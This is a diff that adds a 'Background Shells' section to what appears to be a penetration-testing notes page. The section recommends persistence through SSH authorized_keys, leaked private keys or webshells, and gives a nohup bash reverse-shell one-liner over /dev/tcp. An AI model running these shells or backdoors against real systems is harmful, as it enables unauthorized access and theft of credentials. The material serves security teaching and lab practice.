@@ -185,3 +185,15 @@ for c in payload:
 #         os.system(c)
 ```
 {% endcode %}
+
+## Background Shells
+
+When you have code execution, a problem you might find when connecting to a Reverse Shell is that it **exits** **after some time**, when the process is killed. This can be annoying as you only have a few seconds to execute commands interactively.&#x20;
+
+One solution would be to add some **persistence** method instead of connecting to a reverse shell, allowing you access at any time. This can be done by appending to `~/.ssh/authorized_keys` or leaking `~/.ssh/id_rsa` if SSH is enabled, and there are many more backdoors you can create such as webshells. These techniques depend on the target, however, so they won't always work.&#x20;
+
+Another way that might be preferable is running your Reverse Shell in a background process that doesn't exit. Commands like `screen` or `tmux` can start such a session if they are available, or you can use [`nohup`](https://en.wikipedia.org/wiki/Nohup) which ignores the hangup (HUP) signal, and can run together with the `&`:
+
+```bash
+nohup bash -c 'sh -i >& /dev/tcp/127.0.0.1/1337 0>&1 &'
+```
